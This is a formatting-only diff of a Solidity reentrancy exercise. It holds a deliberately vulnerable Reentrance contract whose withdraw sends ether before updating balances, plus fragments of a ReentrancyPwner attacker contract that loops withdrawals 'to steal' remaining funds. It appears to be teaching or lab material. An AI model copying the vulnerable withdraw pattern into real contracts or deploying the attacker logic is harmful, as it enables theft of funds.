@@ -9,20 +9,22 @@ import {ReentrancyGuard} from "openzeppelin/contracts/security/ReentrancyGuard.s
 contract Reentrance is ReentrancyGuard {
     //
     using SafeMath for uint256;
-    mapping(address => uint) public balances;
+
+    mapping(address => uint256) public balances;
 
     function donate(address _to) public payable {
         balances[_to] = balances[_to].add(msg.value);
     }
 
-    function balanceOf(address _who) public view returns (uint balance) {
+    function balanceOf(address _who) public view returns (uint256 balance) {
         return balances[_who];
     }
 
-    function withdraw(uint _amount) public {
-        unchecked { // bc >=0.8.0
-            if(balances[msg.sender] >= _amount) {
-                (bool result, ) = msg.sender.call{value: _amount}("");
+    function withdraw(uint256 _amount) public {
+        unchecked {
+            // bc >=0.8.0
+            if (balances[msg.sender] >= _amount) {
+                (bool result,) = msg.sender.call{value: _amount}("");
                 if (result) {
                     _amount;
                 }
@@ -31,10 +33,11 @@ contract Reentrance is ReentrancyGuard {
         }
     }
 
-    function withdrawGuarded(uint _amount) public nonReentrant {
-        unchecked { // bc >=0.8.0
-            if(balances[msg.sender] >= _amount) {
-                (bool result, ) = msg.sender.call{value: _amount}("");
+    function withdrawGuarded(uint256 _amount) public nonReentrant {
+        unchecked {
+            // bc >=0.8.0
+            if (balances[msg.sender] >= _amount) {
+                (bool result,) = msg.sender.call{value: _amount}("");
                 if (result) {
                     _amount;
                 }
@@ -49,7 +52,7 @@ contract Reentrance is ReentrancyGuard {
 interface IReentrancy {
     function donate(address _to) external payable;
     // function withdraw(uint _amount) external;
-    function withdrawGuarded(uint _amount) external;
+    function withdrawGuarded(uint256 _amount) external;
 }
 
 contract ReentrancyPwner {
@@ -82,16 +85,15 @@ contract ReentrancyPwner {
         bool moreToSteal = targetTotalRemainingBalance > 0;
 
         if (moreToSteal) {
-            uint256 toWithdraw = initialDeposit < targetTotalRemainingBalance
-                ? initialDeposit
-                : targetTotalRemainingBalance;
+            uint256 toWithdraw =
+                initialDeposit < targetTotalRemainingBalance ? initialDeposit : targetTotalRemainingBalance;
             // target.withdraw(toWithdraw);
             target.withdrawGuarded(toWithdraw);
-        }  
+        }
     }
 }
 
-// event 
+// event
 
 // modifier nonReentrant
 
